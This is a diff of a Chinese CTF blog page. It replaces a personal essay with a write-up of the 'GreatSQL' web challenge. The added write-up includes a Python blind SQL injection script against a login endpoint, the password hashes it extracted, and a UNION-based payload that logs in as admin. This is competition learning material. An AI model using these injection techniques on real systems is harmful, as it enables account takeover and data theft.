@@ -20,20 +20,22 @@
     var CONFIG = {"hostname":"qst137.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="既定的未来凌晨陷入了恐怖的焦虑之中。大概来源于自己前一年半什么也没做，不知道自己兴趣在何处，不知道该干什么。 大一上学期想保清北信工所深埋绩点之中，大一下学期疫情解封想多谈恋爱及时行乐毕业去二线城市躺平，大二上学期又阴差阳错地在太子港一个假期的 push 之下进了天璇，如此搭上了视野扩展的第一架桥。然而我是一个瞻前顾后的人，我不知道自己 CTF 能打多久，能打到什么程度，望着又不自信自己的智商，在">
+  <meta name="description" content="长城杯复赛线下赛没有线上紧张，第一是自己的事情，第二不用抢题做，大概我还在愚昧之峰； WebGreatSQL说是 sqlmap 可以梭？倒显得我不会用 sqlmap 了； 一个登录框，登录成功即可获得 flag ； 会提示用户是否存在，随便试了几个，admin 不存在，user 存在； 盲注爆一下 user 的密码： 12345678910111213141516import requestsur">
 <meta property="og:type" content="article">
-<meta property="og:title" content="既定的未来">
-<meta property="og:url" content="https://qst137.github.io/2024/04/02/2024-04-02-%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/index.html">
+<meta property="og:title" content="长城杯复赛赛后">
+<meta property="og:url" content="https://qst137.github.io/2024/09/14/2024-09-14-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B%E8%B5%9B%E5%90%8E/index.html">
 <meta property="og:site_name" content="QST2&#39;s BLOG">
-<meta property="og:description" content="既定的未来凌晨陷入了恐怖的焦虑之中。大概来源于自己前一年半什么也没做，不知道自己兴趣在何处，不知道该干什么。 大一上学期想保清北信工所深埋绩点之中，大一下学期疫情解封想多谈恋爱及时行乐毕业去二线城市躺平，大二上学期又阴差阳错地在太子港一个假期的 push 之下进了天璇，如此搭上了视野扩展的第一架桥。然而我是一个瞻前顾后的人，我不知道自己 CTF 能打多久，能打到什么程度，望着又不自信自己的智商，在">
+<meta property="og:description" content="长城杯复赛线下赛没有线上紧张，第一是自己的事情，第二不用抢题做，大概我还在愚昧之峰； WebGreatSQL说是 sqlmap 可以梭？倒显得我不会用 sqlmap 了； 一个登录框，登录成功即可获得 flag ； 会提示用户是否存在，随便试了几个，admin 不存在，user 存在； 盲注爆一下 user 的密码： 12345678910111213141516import requestsur">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-04-01T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-09-09T18:27:45.568Z">
+<meta property="article:published_time" content="2024-09-13T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-14T16:39:09.544Z">
 <meta property="article:author" content="QST137">
-<meta property="article:tag" content="发春">
+<meta property="article:tag" content="WriteUp">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://qst137.github.io/2024/04/02/2024-04-02-%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/">
+<link rel="canonical" href="https://qst137.github.io/2024/09/14/2024-09-14-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B%E8%B5%9B%E5%90%8E/">
 
 
 <script id="page-configurations">
@@ -46,7 +48,7 @@
   };
 </script>
 
-  <title>既定的未来 | QST2's BLOG</title>
+  <title>长城杯复赛赛后 | QST2's BLOG</title>
   
 
 
@@ -167,7 +169,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/04/02/2024-04-02-%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5/">
+    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/14/2024-09-14-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B%E8%B5%9B%E5%90%8E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -180,7 +182,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          既定的未来
+          长城杯复赛赛后
         </h1>
 
         <div class="post-meta">
@@ -190,14 +192,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2024-04-02 00:00:00" itemprop="dateCreated datePublished" datetime="2024-04-02T00:00:00+08:00">2024-04-02</time>
+              <time title="Created: 2024-09-14 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-14T00:00:00+08:00">2024-09-14</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2024-09-10 02:27:45" itemprop="dateModified" datetime="2024-09-10T02:27:45+08:00">2024-09-10</time>
+                <time title="Modified: 2024-09-15 00:39:09" itemprop="dateModified" datetime="2024-09-15T00:39:09+08:00">2024-09-15</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -205,7 +207,7 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                 </span>
             </span>
 
@@ -220,20 +222,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="既定的未来"><a href="#既定的未来" class="headerlink" title="既定的未来"></a>既定的未来</h1><p>凌晨陷入了恐怖的焦虑之中。大概来源于自己前一年半什么也没做，不知道自己兴趣在何处，不知道该干什么。</p>
-<p>大一上学期想保清北信工所深埋绩点之中，大一下学期疫情解封想多谈恋爱及时行乐毕业去二线城市躺平，大二上学期又阴差阳错地在<em><strong>太子港</strong></em>一个假期的 push 之下进了天璇，如此搭上了视野扩展的第一架桥。然而我是一个瞻前顾后的人，我不知道自己 CTF 能打多久，能打到什么程度，望着又不自信自己的智商，在新生赛证明了自己的智商，入围后却不知道学什么，繁乱的 WEB 技能树甚至不如实验班课程给我的吸引力大。弱智 Spring boot 学得我忘乎所以，项目的弱智后端做完了又去刷抖音，刷 b 站，打英雄联盟，转眼间一学期的时光就浪费掉了。我都不知道这到底是在奖励自己还是惩罚自己。</p>
-<p>到了这个寒假，在学长 push 之下帮忙写了点 wiki ，跟着看了两个 CTF ，几乎什么都不会，对题目的贡献无限趋近于0。我原谅了自己。颉夏青找我做一个看起来很牛逼的项目，于是我又搞上三四年前就废弃的机器学习了。学着包装 PPT ，给团队成员打鸡血，调试模型。我又觉得自己做事情了，于是又不学了。</p>
-<p>我会在沈阳和我的兄弟们随便找一个包间一打打一天麻将，赴约一场又一场，去体验二十多年的台球厅，和女兄弟、女兄弟的男闺蜜、男闺蜜的男 gay 蜜喝酒唱 K ，我会装醉跟女士拥抱，会装傻差点被女士拽到汉庭酒店，我在这些时间和空间肆意妄为，哈哈大笑，觉得这就是我的人生了——这人生好快乐——可这不是我的人生。</p>
-<p>从我记事儿以来我就没觉得我该这样过，我的理想一向是在某一个行当有所成就，这一般伴随着赚很多（对于我的认知来说很多）的钱。我只是累了，累得出奇。我不知道未来要做什么，不知道要学什么，不知道我会爱上什么样的人。恰恰我又读了自主性最强的 IT ，于是乎我只能为所有未来的可能性努力，什么都学，尝试接触身边所有可能爱上的人。人，至少我是不能这么用的。我超负荷了，什么也做不了了。</p>
-<p>不想谈 MBTI ，但我很早就是 sj 人了。这样的生活对 sj 人来说太绝望了。</p>
-<p>我一向是用心的眼睛盯着旁人才嗯那个有所前进，所幸我在滑落谷底的边缘遇到了三位目标明确行动坚定的人，三位在我的标准里可以托付至少半颗心的人。</p>
-<p>首先是大我两届的<em><strong>谷</strong></em>。此人一度给我一种非常神秘威严的感觉。直到上个假期我向他倾诉了一次，那过后我心里神秘威严的印象并未消解，但我觉得这个人是值得交付心情的，也是乐于收揽心情的。无论是方向上还是情绪上，都可以称之为我的直系学长。在我接触到下一个合适的人之前很长一段时间内，我需要间歇让他做我的引路人。我打心底里是崇拜他的，故他随便的一句认可或者建议都能消解我无数的云雾。</p>
-<p>二是我的好友<em><strong>古</strong></em>。此人和我一样傻逼。近日突然开始专注学一样东西，是我沙河图书馆的官方指定唯一搭子。好朋友间不至于对标，至少我看着同伴在努力，自己也没了摆烂的理由。</p>
-<p>三是<em><strong>忘</strong></em>。追她这件事让我第一次感受到从泛泛想象到清晰目标的转变给我带来的快感。更惊喜的是，她是一个未来规划很明确的人，还是一个努力的人。最重要的一点，我非常喜欢她，喜欢她身上的所有性格特质。我很幸运地被她喜欢了，她带给了我一场世界上最好的恋爱。这一场恋爱收束了我的心绪，我的心里有了未来的样子。很长一段时间内，我要围绕一件事情奋斗，我决定我要成功了。</p>
-<p><strong>我定好了学某个方向，进某个组，拿着这个组的丰厚经验胜利就业。</strong></p>
-<p>这是我最喜欢的节奏，它让我想到四五年前意气风发无所不能的我。那时候我的心里只有高考一件事，每天都在想着如何考进北师大的数学系，当时的方法也非常简单，多做题就行；至于现在如何去学，我要不断地问，没什么信息差，无外乎不停的努力。</p>
-<p>如今实验班退不掉了，我也欣然接受。同时我不再怀疑自己的智商。东隅已逝，桑榆非晚；我如今赤条条地面对这个世界，宣告一个巨大的阳谋，而不怕世界说我如何如何吹牛逼。</p>
-<p>未来无限可能，但是我马上二十岁了，应该选择一种去实现了。</p>
+        <h1 id="长城杯复赛"><a href="#长城杯复赛" class="headerlink" title="长城杯复赛"></a>长城杯复赛</h1><p>线下赛没有线上紧张，第一是自己的事情，第二不用抢题做，大概我还在愚昧之峰；</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="GreatSQL"><a href="#GreatSQL" class="headerlink" title="GreatSQL"></a>GreatSQL</h3><p>说是 sqlmap 可以梭？倒显得我不会用 sqlmap 了；</p>
+<p>一个登录框，登录成功即可获得 flag ；</p>
+<p>会提示用户是否存在，随便试了几个，admin 不存在，user 存在；</p>
+<p>盲注爆一下 user 的密码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.106.48.123:39446/login&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    right_password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> password_i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> <span class="string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnm&#x27;</span>:</span><br><span class="line">            ascii_i = <span class="built_in">ord</span>(char)</span><br><span class="line">            data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">f&quot;user\&#x27;and ascii(substr(password,<span class="subst">&#123;password_i&#125;</span>,1))=<span class="subst">&#123;ascii_i&#125;</span>;#&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;qst&quot;</span>&#125;</span><br><span class="line">            resp = requests.post(url=url,data = data)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(resp.text) == <span class="number">4</span>:</span><br><span class="line">                <span class="built_in">print</span>(ascii_i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                right_password = right_password+<span class="built_in">chr</span>(ascii_i)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;now:<span class="subst">&#123;right_password&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(password_i)</span><br><span class="line"><span class="comment"># now:e10adc3949ba59abbe56e057f20f883e</span></span><br></pre></td></tr></table></figure>
+
+<p>爆 md5，密码是 <code>md5(&#39;123456&#39;)</code>；</p>
+<p>登录提示要 login as admin，类似盲注爆一下用户名，爆出 test，pika 两个，分别爆密码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># test</span></span><br><span class="line"><span class="comment"># now:098f6bcd4621d373cade4e832627b4f6</span></span><br><span class="line"><span class="comment"># md5(&#x27;test&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pika</span></span><br><span class="line"><span class="comment"># now:81ccafb8ef19e583f737f569c51d3cde</span></span><br><span class="line"><span class="comment"># not a weak md5</span></span><br></pre></td></tr></table></figure>
+
+<p>登了没用，没有 admin；</p>
+<p>sql 执行出错会报不存在，测一下后台 <code>select</code> 的列数，username 为<code>user&#39; union select 1,2,3,4</code> 显示密码错误而非不存在，说明结果有四列；</p>
+<p>最终 payload：<code>urlencode(&#39;username=usr&#39; union select 1,2,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,&#39;admin&#39;;#&amp;password=123456)</code>；</p>
+<h2 id="Todo-List"><a href="#Todo-List" class="headerlink" title="Todo List"></a>Todo List</h2><p>需要看一些 Java，我总感觉 OpenGauss 连网条件下应该很简单；</p>
+<p>还需要学学如何配网；</p>
+<p>然后把 sqlmap 用明白。</p>
 
     </div>
 
@@ -243,7 +248,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E5%8F%91%E6%98%A5/" rel="tag"># 发春</a>
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/sql/" rel="tag"># sql</a>
           </div>
 
         
@@ -252,13 +259,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/11/01/2023-11-01-Docker-Java%20%E4%BD%BF%E7%94%A8/" rel="prev" title="Docker-Java 使用小记">
-      <i class="fa fa-chevron-left"></i> Docker-Java 使用小记
+    <a href="/2024/09/10/2024-09-10-%E5%A3%B9%E4%B8%AA%E6%A2%A6/" rel="prev" title="壹个梦">
+      <i class="fa fa-chevron-left"></i> 壹个梦
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2024/08/30/2024-08-30-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A3%B9/" rel="next" title="区块链学习之壹">
-      区块链学习之壹 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -317,7 +321,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A2%E5%AE%9A%E7%9A%84%E6%9C%AA%E6%9D%A5"><span class="nav-number">1.</span> <span class="nav-text">既定的未来</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%A4%8D%E8%B5%9B"><span class="nav-number">1.</span> <span class="nav-text">长城杯复赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GreatSQL"><span class="nav-number">1.1.1.</span> <span class="nav-text">GreatSQL</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Todo-List"><span class="nav-number">1.2.</span> <span class="nav-text">Todo List</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
